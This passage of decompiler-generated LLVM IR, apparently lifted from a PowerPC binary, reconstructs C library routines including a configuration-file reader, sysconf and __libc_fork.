  %v2_1000c420 = inttoptr i32 %v1_1000c420 to i32*
  %v3_1000c420 = load i32, i32* %v2_1000c420, align 4
  store i32 %v3_1000c420, i32* @r9, align 4
  %v1_1000c424 = mul nuw nsw i32 %v4_1000c41c, 2
  %v2_1000c428 = add i32 %v3_1000c420, %v1_1000c424
  %v3_1000c428 = inttoptr i32 %v2_1000c428 to i16*
  %v4_1000c428 = load i16, i16* %v3_1000c428, align 2
  %v5_1000c428 = zext i16 %v4_1000c428 to i32
  %v1_1000c42c = call i32 @__asm_rlwinm(i32 %v5_1000c428, i32 29, i32 31, i32 31)
  %v0_1000c430 = load i32, i32* @r31, align 4
  %v2_1000c430 = add i32 %v0_1000c430, %v1_1000c42c
  store i32 %v2_1000c430, i32* @r31, align 4
  br label %dec_label_pc_1000c434.backedge

dec_label_pc_1000c434.backedge:                   ; preds = %dec_label_pc_1000c41c, %dec_label_pc_1000c3f0, %dec_label_pc_1000c404, %dec_label_pc_1000c410
  %v0_1000c434.pre = load i32, i32* @r30, align 4
  %v0_1000c440.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000c434

dec_label_pc_1000c434:                            ; preds = %dec_label_pc_1000c434.backedge, %dec_label_pc_1000c3d8
  %v0_1000c440 = phi i32 [ %v0_1000c440.pre, %dec_label_pc_1000c434.backedge ], [ ptrtoint (i32* @global_var_100100c4.43 to i32), %dec_label_pc_1000c3d8 ]
  %v0_1000c434 = phi i32 [ %v0_1000c434.pre, %dec_label_pc_1000c434.backedge ], [ %v2_1000c3cc, %dec_label_pc_1000c3d8 ]
  store i32 268485704, i32* @lr, align 4
  %v5_1000c444 = call i32 @__GI_config_read(i32 %v0_1000c434, i32* nonnull %stack_var_-40, i32 258, i32 %v0_1000c440)
  %v3_1000c448 = icmp eq i32 %v5_1000c444, 0
  br i1 %v3_1000c448, label %dec_label_pc_1000c4c8, label %dec_label_pc_1000c3f0

dec_label_pc_1000c454:                            ; preds = %entry
  store i32 268485728, i32* @lr, align 4
  %v2_1000c45c = call i32 @__GI_config_open(i32 ptrtoint ([14 x i8]* @global_var_10010c04.526 to i32))
  store i32 %v2_1000c45c, i32* @r30, align 4
  %v3_1000c460 = icmp eq i32 %v2_1000c45c, 0
  store i32 0, i32* @r31, align 4
  br i1 %v3_1000c460, label %dec_label_pc_1000c4c8, label %dec_label_pc_1000c470

dec_label_pc_1000c470:                            ; preds = %dec_label_pc_1000c454
  store i32 ptrtoint (i32* @global_var_10010bf4.527 to i32), i32* @r27, align 4
  store i32 268500992, i32* @r9, align 4
  br label %dec_label_pc_1000c4a4

dec_label_pc_1000c48c:                            ; preds = %dec_label_pc_1000c4a4
  %v0_1000c4c0 = load i32, i32* @r28, align 4
  %v1_1000c4c0 = inttoptr i32 %v0_1000c4c0 to i8*
  %v3_1000c48c = load i32, i32* %stack_var_-40, align 4
  %v1_1000c490 = inttoptr i32 %v3_1000c48c to i32*
  %v2_1000c490 = load i32, i32* %v1_1000c490, align 4
  store i32 %v2_1000c490, i32* @r4, align 4
  %v5_1000c494 = call i32 @__GI_strcoll(i8* %v1_1000c4c0, i32 %v2_1000c490, i32 %v3_1000c48c)
  %v1_1000c498 = sub i32 0, %v5_1000c494
  %v2_1000c498 = sub i32 -1, %v5_1000c494
  %v4_1000c498 = icmp uge i32 %v2_1000c498, %v1_1000c498
  %v0_1000c49c = load i32, i32* @r31, align 4
  %v2_1000c49c = zext i1 %v4_1000c498 to i32
  %v3_1000c49c = add i32 %v0_1000c49c, %v2_1000c49c
  store i32 %v3_1000c49c, i32* @r31, align 4
  %v0_1000c4b0.pre = load i32, i32* @r27, align 4
  %v0_1000c4b4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000c4a4

dec_label_pc_1000c4a4:                            ; preds = %dec_label_pc_1000c470, %dec_label_pc_1000c48c
  %v0_1000c4b4 = phi i32 [ %v2_1000c45c, %dec_label_pc_1000c470 ], [ %v0_1000c4b4.pre, %dec_label_pc_1000c48c ]
  %v0_1000c4b0 = phi i32 [ ptrtoint (i32* @global_var_10010bf4.527 to i32), %dec_label_pc_1000c470 ], [ %v0_1000c4b0.pre, %dec_label_pc_1000c48c ]
  store i32 268485820, i32* @lr, align 4
  %v5_1000c4b8 = call i32 @__GI_config_read(i32 %v0_1000c4b4, i32* nonnull %stack_var_-40, i32 459266, i32 %v0_1000c4b0)
  %v3_1000c4bc = icmp eq i32 %v5_1000c4b8, 0
  br i1 %v3_1000c4bc, label %dec_label_pc_1000c4c8, label %dec_label_pc_1000c48c

dec_label_pc_1000c4c8:                            ; preds = %dec_label_pc_1000c434, %dec_label_pc_1000c4a4, %dec_label_pc_1000c454
  %v0_1000c4c8 = load i32, i32* @r30, align 4
  store i32 268485840, i32* @lr, align 4
  %v1_1000c4cc = inttoptr i32 %v0_1000c4c8 to i32*
  %v2_1000c4cc = call i32 @__GI_config_close(i32* %v1_1000c4cc)
  %v0_1000c4d0 = load i32, i32* @r31, align 4
  %v3_1000c4d0 = icmp eq i32 %v0_1000c4d0, 0
  br i1 %v3_1000c4d0, label %dec_label_pc_1000c4d8, label %dec_label_pc_1000c4dc

dec_label_pc_1000c4d8:                            ; preds = %dec_label_pc_1000c4c8
  br label %dec_label_pc_1000c4dc

dec_label_pc_1000c4dc:                            ; preds = %dec_label_pc_1000c4c8, %dec_label_pc_1000c4d8
  %v0_1000c4e0 = phi i32 [ %v0_1000c4d0, %dec_label_pc_1000c4c8 ], [ 1, %dec_label_pc_1000c4d8 ]
  ret i32 %v0_1000c4e0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 0, 2, 1, 3, 4 }
  uselistorder i32 268500992, { 32, 33, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_1000c4dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000c4c8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000c4a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c434.backedge, { 0, 3, 2, 1 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v2_1000c4f4 = icmp ugt i32 %arg1, 240
  br i1 %v2_1000c4f4, label %dec_label_pc_1000c538, label %dec_label_pc_1000c50c

dec_label_pc_1000c50c:                            ; preds = %entry
  %v1_1000c510 = mul i32 %arg1, 4
  %v2_1000c518 = add i32 %v1_1000c510, ptrtoint (i32* @global_var_10010830.529 to i32)
  %v3_1000c518 = inttoptr i32 %v2_1000c518 to i32*
  %v4_1000c518 = load i32, i32* %v3_1000c518, align 4
  %v2_1000c51c = add i32 %v4_1000c518, ptrtoint (i32* @global_var_10010830.529 to i32)
  call void @__pseudo_branch(i32 %v2_1000c51c)
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000c750

dec_label_pc_1000c538:                            ; preds = %entry
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1000c548 = load i32, i32* @r2, align 4
  %v1_1000c54c = add i32 %v0_1000c548, -28672
  %v2_1000c550 = inttoptr i32 %v1_1000c54c to i32*
  store i32 22, i32* %v2_1000c550, align 4
  %v0_1000c760.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000c750

dec_label_pc_1000c750:                            ; preds = %dec_label_pc_1000c50c, %dec_label_pc_1000c538
  %v0_1000c760 = phi i32 [ 1, %dec_label_pc_1000c50c ], [ %v0_1000c760.pre, %dec_label_pc_1000c538 ]
  ret i32 %v0_1000c760

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 240, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c750, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000c764 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000c764, i32* %stack_var_-64, align 4
  %v5_1000c764 = ptrtoint i32* %stack_var_-64 to i32
  store i32 268566528, i32* @r10, align 4
  store i32 %v5_1000c764, i32* @r31, align 4
  %v3_1000c81c16 = load i32, i32* @global_var_10021228.535, align 4
  store i32 %v3_1000c81c16, i32* %r30.global-to-local, align 4
  %v3_1000c82019 = icmp eq i32 %v3_1000c81c16, 0
  br i1 %v3_1000c82019, label %dec_label_pc_1000c82c, label %dec_label_pc_1000c780.preheader

dec_label_pc_1000c780.preheader:                  ; preds = %entry
  %v1_1000c784 = add i32 %v3_1000c81c16, 20
  %v2_1000c784 = inttoptr i32 %v1_1000c784 to i32*
  br label %dec_label_pc_1000c780

dec_label_pc_1000c780:                            ; preds = %dec_label_pc_1000c780.preheader, %dec_label_pc_1000c81c.backedge
  %v3_1000c784 = load i32, i32* %v2_1000c784, align 4
  %v3_1000c788 = icmp eq i32 %v3_1000c784, 0
  br i1 %v3_1000c788, label %dec_label_pc_1000c81c.backedge, label %dec_label_pc_1000c794

dec_label_pc_1000c81c.backedge:                   ; preds = %dec_label_pc_1000c780, %dec_label_pc_1000c794
  store i32 %v3_1000c81c16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000c780

dec_label_pc_1000c794:                            ; preds = %dec_label_pc_1000c780
  %v1_1000c7a0 = load i32, i32* @r8, align 4
  %v2_1000c7a0 = sub i32 %v1_1000c7a0, %v3_1000c784
  store i32 %v2_1000c7a0, i32* @r8, align 4
  %v5_1000c7a0 = icmp eq i32 %v2_1000c7a0, 0
  br i1 %v5_1000c7a0, label %dec_label_pc_1000c7c0.preheader, label %dec_label_pc_1000c81c.backedge

dec_label_pc_1000c7c0.preheader:                  ; preds = %dec_label_pc_1000c794
  store i1 true, i1* %cr0_eq.global-to-local, align 1
  %v2_1000c7dc = ptrtoint i32* %stack_var_-73 to i32
  %v4_1000c810 = icmp eq i32 %v1_1000c7a0, %v3_1000c784
  br label %dec_label_pc_1000c7c0

dec_label_pc_1000c7c0.loopexit:                   ; preds = %dec_label_pc_1000c804
  store i32 %v1_1000c808, i32* @r8, align 4
  br label %dec_label_pc_1000c7c0

dec_label_pc_1000c7c0:                            ; preds = %dec_label_pc_1000c7c0.preheader, %dec_label_pc_1000c7c0.loopexit
  %v0_1000c7c0 = phi i32 [ %v2_1000c7ec, %dec_label_pc_1000c7c0.loopexit ], [ %v3_1000c81c16, %dec_label_pc_1000c7c0.preheader ]
  %storemerge1 = phi i32 [ %v1_1000c7e0, %dec_label_pc_1000c7c0.loopexit ], [ 0, %dec_label_pc_1000c7c0.preheader ]
  store i32 %storemerge1, i32* %r29.global-to-local, align 4
  %v1_1000c7c0 = add i32 %v0_1000c7c0, 4
  %v2_1000c7c0 = inttoptr i32 %v1_1000c7c0 to i32*
  %v3_1000c7c0 = load i32, i32* %v2_1000c7c0, align 4
  %v3_1000c7c4 = icmp eq i32 %v3_1000c7c0, 0
  br i1 %v3_1000c7c4, label %dec_label_pc_1000c7d4, label %dec_label_pc_1000c7cc

dec_label_pc_1000c7cc:                            ; preds = %dec_label_pc_1000c7c0
  call void @__pseudo_call(i32 %v3_1000c7c0)
  br label %dec_label_pc_1000c7d4

dec_label_pc_1000c7d4:                            ; preds = %dec_label_pc_1000c7c0, %dec_label_pc_1000c7cc
  %v1_1000c7e0 = call i32 @__asm_rlwinm(i32 %v2_1000c7dc, i32 0, i32 0, i32 27)
  %v0_1000c7e4 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000c7e4 = inttoptr i32 %v1_1000c7e0 to i32*
  store i32 %v0_1000c7e4, i32* %v2_1000c7e4, align 4
  %v0_1000c7e8 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000c7e8 = add i32 %v1_1000c7e0, 4
  %v3_1000c7e8 = inttoptr i32 %v2_1000c7e8 to i32*
  store i32 %v0_1000c7e8, i32* %v3_1000c7e8, align 4
  %v0_1000c7ec = load i32, i32* %r30.global-to-local, align 4
  %v1_1000c7ec = inttoptr i32 %v0_1000c7ec to i32*
  %v2_1000c7ec = load i32, i32* %v1_1000c7ec, align 4
  store i32 %v2_1000c7ec, i32* %r30.global-to-local, align 4
  %v3_1000c7f0 = icmp eq i32 %v2_1000c7ec, 0
  br i1 %v3_1000c7f0, label %dec_label_pc_1000c82c, label %dec_label_pc_1000c804.preheader

dec_label_pc_1000c804.preheader:                  ; preds = %dec_label_pc_1000c7d4
  %r8.promoted = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000c804

dec_label_pc_1000c804:                            ; preds = %dec_label_pc_1000c804.preheader, %dec_label_pc_1000c804
  %v1_1000c80820 = phi i32 [ %r8.promoted, %dec_label_pc_1000c804.preheader ], [ %v1_1000c808, %dec_label_pc_1000c804 ]
  %v1_1000c808 = add i32 %v1_1000c80820, 1
  br i1 %v4_1000c810, label %dec_label_pc_1000c7c0.loopexit, label %dec_label_pc_1000c804

dec_label_pc_1000c82c:                            ; preds = %dec_label_pc_1000c7d4, %entry
  %storemerge = phi i32 [ 0, %entry ], [ %v1_1000c7e0, %dec_label_pc_1000c7d4 ]
  store i32 %storemerge, i32* @r29, align 4
  %v0_1000c830 = load i32, i32* @r2, align 4
  %v1_1000c830 = add i32 %v0_1000c830, -29808
  store i32 %v1_1000c830, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100212d0.536 to i32), i32* %r30.global-to-local, align 4
  %v3_1000c838 = load i32, i32* @global_var_100212d8.537, align 4
  %v4_1000c83c = icmp eq i32 %v3_1000c838, %v1_1000c830
  br i1 %v4_1000c83c, label %dec_label_pc_1000c878, label %dec_label_pc_1000c84c

dec_label_pc_1000c84c:                            ; preds = %dec_label_pc_1000c82c
  store i32 0, i32* @r9, align 4
  %v0_1000c850 = load i32, i32* @r10, align 4
  %v4_1000c850 = icmp eq i32 %v0_1000c850, 0
  store i1 %v4_1000c850, i1* @cr0_eq, align 1
  br i1 %v4_1000c850, label %dec_label_pc_1000c874, label %dec_label_pc_1000c86c

dec_label_pc_1000c86c:                            ; preds = %dec_label_pc_1000c84c
  store i32 ptrtoint (i32* @global_var_100212d0.536 to i32), i32* @r3, align 4
  %v0_1000c870 = call i32 @__lll_lock_wait_private()
  %v0_1000c874.pre = load i32, i32* %r28.global-to-local, align 4
  %v0_1000c87c.pre.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1000c874

dec_label_pc_1000c874:                            ; preds = %dec_label_pc_1000c84c, %dec_label_pc_1000c86c
  %v0_1000c87c.pre = phi i32 [ %v0_1000c830, %dec_label_pc_1000c84c ], [ %v0_1000c87c.pre.pre, %dec_label_pc_1000c86c ]
  %v0_1000c874 = phi i32 [ %v1_1000c830, %dec_label_pc_1000c84c ], [ %v0_1000c874.pre, %dec_label_pc_1000c86c ]
  store i32 %v0_1000c874, i32* @global_var_100212d8.537, align 4
  br label %dec_label_pc_1000c878

dec_label_pc_1000c878:                            ; preds = %dec_label_pc_1000c82c, %dec_label_pc_1000c874
  %v0_1000c87c = phi i32 [ %v0_1000c830, %dec_label_pc_1000c82c ], [ %v0_1000c87c.pre, %dec_label_pc_1000c874 ]
  %v1_1000c87c = add i32 %v0_1000c87c, -29808
  store i32 %v1_1000c87c, i32* %r7.global-to-local, align 4
  %v3_1000c888 = load i32, i32* @global_var_100212d4.538, align 4
  %v1_1000c898 = add i32 %v3_1000c888, 1
  store i32 %v1_1000c898, i32* @global_var_100212d4.538, align 4
  %v1_1000c8a4 = add i32 %v0_1000c87c, -29700
  %v2_1000c8a4 = inttoptr i32 %v1_1000c8a4 to i32*
  %v3_1000c8a4 = load i32, i32* %v2_1000c8a4, align 4
  store i32 %v3_1000c8a4, i32* @r30, align 4
  %v1_1000c8a8 = sub i32 0, %v3_1000c8a4
  store i32 %v1_1000c8a8, i32* %v2_1000c8a4, align 4
  %v0_1000c8b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000c8b0 = add i32 %v0_1000c8b0, 104
  store i32 %v1_1000c8b0, i32* %r7.global-to-local, align 4
  %v0_1000c8bc = call i32 @__asm_mfcr()
  %v1_1000c8c0 = and i32 %v0_1000c8bc, 268435456
  store i32 %v1_1000c8c0, i32* @r8, align 4
  %v3_1000c8c0 = icmp eq i32 %v1_1000c8c0, 0
  store i1 %v3_1000c8c0, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000c8c0, label %dec_label_pc_1000c8e4, label %dec_label_pc_1000c8c8

dec_label_pc_1000c8c8:                            ; preds = %dec_label_pc_1000c878
  store i32 -1, i32* @r28, align 4
  %v0_1000c8d4 = load i32, i32* @r2, align 4
  %v1_1000c8d8 = add i32 %v0_1000c8d4, -28672
  %v2_1000c8dc = inttoptr i32 %v1_1000c8d8 to i32*
  store i32 %v0_1000c8bc, i32* %v2_1000c8dc, align 4
  br label %dec_label_pc_1000c9b4

dec_label_pc_1000c8e4:                            ; preds = %dec_label_pc_1000c878
  %v3_1000c8e4 = icmp eq i32 %v0_1000c8bc, 0
  store i32 %v0_1000c8bc, i32* @r28, align 4
  br i1 %v3_1000c8e4, label %dec_label_pc_1000c8f0, label %dec_label_pc_1000c9b4

dec_label_pc_1000c8f0:                            ; preds = %dec_label_pc_1000c8e4
  %v3_1000c8f4 = load i32, i32* @global_var_10021224.539, align 4
  %v3_1000c8f8 = icmp eq i32 %v3_1000c8f4, 0
  br i1 %v3_1000c8f8, label %dec_label_pc_1000c90c, label %dec_label_pc_1000c900

dec_label_pc_1000c900:                            ; preds = %dec_label_pc_1000c8f0
  %v1_1000c900 = inttoptr i32 %v3_1000c8f4 to i32*
  %v2_1000c900 = load i32, i32* %v1_1000c900, align 4
  %v1_1000c904 = add i32 %v2_1000c900, 4
  store i32 %v1_1000c904, i32* %v1_1000c900, align 4
  br label %dec_label_pc_1000c90c

dec_label_pc_1000c90c:                            ; preds = %dec_label_pc_1000c8f0, %dec_label_pc_1000c900
  %v0_1000c90c = load i32, i32* @r2, align 4
  %v3_1000c914 = load i32, i32* bitcast (i32** @global_var_100211d0.540 to i32*), align 4
  store i32 %v3_1000c914, i32* @r10, align 4
  %v1_1000c91c = add i32 %v0_1000c90c, -29704
  %v2_1000c91c = inttoptr i32 %v1_1000c91c to i32*
  %v3_1000c91c = load i32, i32* %v2_1000c91c, align 4
  %v2_1000c928 = add i32 %v0_1000c90c, -29700
  %v3_1000c928 = inttoptr i32 %v2_1000c928 to i32*
  store i32 %v3_1000c91c, i32* %v3_1000c928, align 4
  %v0_1000c944.pr = load i32, i32* @r10, align 4
  %v3_1000c9449 = icmp eq i32 %v0_1000c944.pr, 0
  br i1 %v3_1000c9449, label %dec_label_pc_1000c954, label %dec_label_pc_1000c930

dec_label_pc_1000c930:                            ; preds = %dec_label_pc_1000c90c, %dec_label_pc_1000c930
  %v0_1000c938 = phi i32 [ %v3_1000c938, %dec_label_pc_1000c930 ], [ %v0_1000c944.pr, %dec_label_pc_1000c90c ]
  %v1_1000c938 = add i32 %v0_1000c938, 32
  %v2_1000c938 = inttoptr i32 %v1_1000c938 to i32*
  %v3_1000c938 = load i32, i32* %v2_1000c938, align 4
  %v3_1000c944 = icmp eq i32 %v3_1000c938, 0
  br i1 %v3_1000c944, label %dec_label_pc_1000c944.dec_label_pc_1000c954_crit_edge, label %dec_label_pc_1000c930

dec_label_pc_1000c944.dec_label_pc_1000c954_crit_edge: ; preds = %dec_label_pc_1000c930
  br label %dec_label_pc_1000c954

dec_label_pc_1000c954:                            ; preds = %dec_label_pc_1000c944.dec_label_pc_1000c954_crit_edge, %dec_label_pc_1000c90c
  %v0_1000c9a03 = load i32, i32* @r29, align 4
  %v3_1000c9a06 = icmp eq i32 %v0_1000c9a03, 0
  br i1 %v3_1000c9a06, label %dec_label_pc_1000c9a8, label %dec_label_pc_1000c978

dec_label_pc_1000c978:                            ; preds = %dec_label_pc_1000c954, %dec_label_pc_1000c990
  %v0_1000c978 = phi i32 [ %v0_1000c9a0, %dec_label_pc_1000c990 ], [ %v0_1000c9a03, %dec_label_pc_1000c954 ]
  %v1_1000c978 = inttoptr i32 %v0_1000c978 to i32*
  %v2_1000c978 = load i32, i32* %v1_1000c978, align 4
  %v1_1000c97c = add i32 %v2_1000c978, 12
  %v2_1000c97c = inttoptr i32 %v1_1000c97c to i32*
  %v3_1000c97c = load i32, i32* %v2_1000c97c, align 4
  %v3_1000c980 = icmp eq i32 %v3_1000c97c, 0
  br i1 %v3_1000c980, label %dec_label_pc_1000c990, label %dec_label_pc_1000c988

dec_label_pc_1000c988:                            ; preds = %dec_label_pc_1000c978
  call void @__pseudo_call(i32 %v3_1000c97c)
  %v0_1000c990.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000c990

dec_label_pc_1000c990:                            ; preds = %dec_label_pc_1000c978, %dec_label_pc_1000c988
  %v0_1000c990 = phi i32 [ %v0_1000c978, %dec_label_pc_1000c978 ], [ %v0_1000c990.pre, %dec_label_pc_1000c988 ]
  %v1_1000c990 = inttoptr i32 %v0_1000c990 to i32*
  %v2_1000c990 = load i32, i32* %v1_1000c990, align 4
  %v1_1000c998 = add i32 %v0_1000c990, 4
  %v2_1000c998 = inttoptr i32 %v1_1000c998 to i32*
  %v3_1000c998 = load i32, i32* %v2_1000c998, align 4
  store i32 %v3_1000c998, i32* @r29, align 4
  %v2_1000c99c = add i32 %v2_1000c990, 20
  %v3_1000c99c = inttoptr i32 %v2_1000c99c to i32*
  store i32 1, i32* %v3_1000c99c, align 4
  %v0_1000c9a0 = load i32, i32* @r29, align 4
  %v3_1000c9a0 = icmp eq i32 %v0_1000c9a0, 0
  br i1 %v3_1000c9a0, label %dec_label_pc_1000c9a8, label %dec_label_pc_1000c978

dec_label_pc_1000c9a8:                            ; preds = %dec_label_pc_1000c990, %dec_label_pc_1000c954
  store i32 0, i32* @global_var_1002122c.543, align 4
  br label %dec_label_pc_1000ca80

dec_label_pc_1000c9b4:                            ; preds = %dec_label_pc_1000c8e4, %dec_label_pc_1000c8c8
  %v0_1000c9b4 = load i32, i32* @r30, align 4
  %v1_1000c9b4 = load i32, i32* @r2, align 4
  %v2_1000c9b4 = add i32 %v1_1000c9b4, -29700
  %v3_1000c9b4 = inttoptr i32 %v2_1000c9b4 to i32*
  store i32 %v0_1000c9b4, i32* %v3_1000c9b4, align 4
  %v3_1000c9c0 = load i32, i32* @global_var_100212d4.538, align 4
  %v1_1000c9c4 = add i32 %v3_1000c9c0, -1
  %v3_1000c9c8 = icmp eq i32 %v1_1000c9c4, 0
  store i32 %v1_1000c9c4, i32* @global_var_100212d4.538, align 4
  br i1 %v3_1000c9c8, label %dec_label_pc_1000c9d4, label %dec_label_pc_1000ca78thread-pre-split

dec_label_pc_1000c9d4:                            ; preds = %dec_label_pc_1000c9b4
  store i32 0, i32* @global_var_100212d8.537, align 4
  br label %dec_label_pc_1000c9dc

dec_label_pc_1000c9dc:                            ; preds = %dec_label_pc_1000c9dc, %dec_label_pc_1000c9d4
  %v0_1000c9e4 = phi i1 [ false, %dec_label_pc_1000c9dc ], [ %v3_1000c8c0, %dec_label_pc_1000c9d4 ]
  br i1 %v0_1000c9e4, label %dec_label_pc_1000c9e8, label %dec_label_pc_1000c9dc

dec_label_pc_1000c9e8:                            ; preds = %dec_label_pc_1000c9dc
  %tmp40 = icmp slt i32 %v0_1000c8bc, 2
  br i1 %tmp40, label %dec_label_pc_1000ca78thread-pre-split, label %dec_label_pc_1000c9f0

dec_label_pc_1000c9f0:                            ; preds = %dec_label_pc_1000c9e8
  %v0_1000ca04 = call i32 @__asm_mfcr()
  br label %dec_label_pc_1000ca78thread-pre-split

dec_label_pc_1000ca0c:                            ; preds = %dec_label_pc_1000ca78thread-pre-split, %dec_label_pc_1000ca74
  %v0_1000ca0c = phi i32 [ %v3_1000ca74, %dec_label_pc_1000ca74 ], [ %v0_1000ca78.pr, %dec_label_pc_1000ca78thread-pre-split ]
  %v1_1000ca0c = inttoptr i32 %v0_1000ca0c to i32*
  %v2_1000ca0c = load i32, i32* %v1_1000ca0c, align 4
  %v1_1000ca10 = add i32 %v2_1000ca0c, 8
  %v2_1000ca10 = inttoptr i32 %v1_1000ca10 to i32*
  %v3_1000ca10 = load i32, i32* %v2_1000ca10, align 4
  %v3_1000ca14 = icmp eq i32 %v3_1000ca10, 0
  br i1 %v3_1000ca14, label %dec_label_pc_1000ca24, label %dec_label_pc_1000ca1c

dec_label_pc_1000ca1c:                            ; preds = %dec_label_pc_1000ca0c
  call void @__pseudo_call(i32 %v3_1000ca10)
  %v0_1000ca24.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000ca24

dec_label_pc_1000ca24:                            ; preds = %dec_label_pc_1000ca0c, %dec_label_pc_1000ca1c
  %v0_1000ca48 = phi i32 [ %v0_1000ca0c, %dec_label_pc_1000ca0c ], [ %v0_1000ca24.pre, %dec_label_pc_1000ca1c ]
  %v1_1000ca24 = inttoptr i32 %v0_1000ca48 to i32*
  %v0_1000ca3c.pr = load i1, i1* %cr0_eq.global-to-local, align 1
  %v0_1000ca34 = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000ca30

dec_label_pc_1000ca30:                            ; preds = %dec_label_pc_1000ca30, %dec_label_pc_1000ca24
  %v0_1000ca3c = phi i1 [ false, %dec_label_pc_1000ca30 ], [ %v0_1000ca3c.pr, %dec_label_pc_1000ca24 ]
  br i1 %v0_1000ca3c, label %dec_label_pc_1000ca40, label %dec_label_pc_1000ca30

dec_label_pc_1000ca40:                            ; preds = %dec_label_pc_1000ca30
  %v3_1000ca40 = icmp eq i32 %v0_1000ca34, 1
  br i1 %v3_1000ca40, label %dec_label_pc_1000ca48, label %dec_label_pc_1000ca74

dec_label_pc_1000ca48:                            ; preds = %dec_label_pc_1000ca40
  %v2_1000ca48 = load i32, i32* %v1_1000ca24, align 4
  %v1_1000ca58 = add i32 %v2_1000ca48, 24
  %v2_1000ca58 = inttoptr i32 %v1_1000ca58 to i32*
  %v3_1000ca58 = load i32, i32* %v2_1000ca58, align 4
  %v3_1000ca60 = icmp eq i32 %v3_1000ca58, 0
  br i1 %v3_1000ca60, label %dec_label_pc_1000ca74, label %dec_label_pc_1000ca68

dec_label_pc_1000ca68:                            ; preds = %dec_label_pc_1000ca48
  %v0_1000ca70 = call i32 @__asm_mfcr()
  %v0_1000ca74.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000ca74

dec_label_pc_1000ca74:                            ; preds = %dec_label_pc_1000ca40, %dec_label_pc_1000ca48, %dec_label_pc_1000ca68
  %v0_1000ca74 = phi i32 [ %v0_1000ca48, %dec_label_pc_1000ca40 ], [ %v0_1000ca48, %dec_label_pc_1000ca48 ], [ %v0_1000ca74.pre, %dec_label_pc_1000ca68 ]
  %v1_1000ca74 = add i32 %v0_1000ca74, 4
  %v2_1000ca74 = inttoptr i32 %v1_1000ca74 to i32*
  %v3_1000ca74 = load i32, i32* %v2_1000ca74, align 4
  store i32 %v3_1000ca74, i32* @r29, align 4
  %v3_1000ca78 = icmp eq i32 %v3_1000ca74, 0
  br i1 %v3_1000ca78, label %dec_label_pc_1000ca80, label %dec_label_pc_1000ca0c

dec_label_pc_1000ca78thread-pre-split:            ; preds = %dec_label_pc_1000c9f0, %dec_label_pc_1000c9e8, %dec_label_pc_1000c9b4
  %v0_1000ca78.pr = load i32, i32* @r29, align 4
  %v3_1000ca7815 = icmp eq i32 %v0_1000ca78.pr, 0
  br i1 %v3_1000ca7815, label %dec_label_pc_1000ca80, label %dec_label_pc_1000ca0c

dec_label_pc_1000ca80:                            ; preds = %dec_label_pc_1000ca74, %dec_label_pc_1000ca78thread-pre-split, %dec_label_pc_1000c9a8
  %v0_1000ca84 = load i32, i32* @r28, align 4
  ret i32 %v0_1000ca84

; uselistorder directives
  uselistorder i32 %v0_1000ca78.pr, { 1, 0 }
  uselistorder i32 %v3_1000ca74, { 1, 2, 0 }
  uselistorder i32 %v0_1000c9a0, { 1, 0 }
  uselistorder i32 %v0_1000c990, { 1, 0 }
  uselistorder i32 %v3_1000c938, { 1, 0 }
  uselistorder i32 %v0_1000c8bc, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_1000c830, { 1, 0, 2 }
  uselistorder i32 %v2_1000c7ec, { 1, 2, 0 }
  uselistorder i32 %v1_1000c7e0, { 0, 2, 3, 1 }
  uselistorder i32 %v3_1000c81c16, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 3, 4, 2, 5 }
  uselistorder i1* %cr0_eq.global-to-local, { 1, 2, 0 }
  uselistorder i32* @r10, { 0, 5, 6, 7, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000ca80, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ca74, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000ca24, { 1, 0 }
  uselistorder label %dec_label_pc_1000c990, { 1, 0 }
  uselistorder label %dec_label_pc_1000c978, { 1, 0 }
  uselistorder label %dec_label_pc_1000c930, { 1, 0 }
  uselistorder label %dec_label_pc_1000c90c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c878, { 1, 0 }
  uselistorder label %dec_label_pc_1000c874, { 1, 0 }
  uselistorder label %dec_label_pc_1000c804, { 1, 0 }
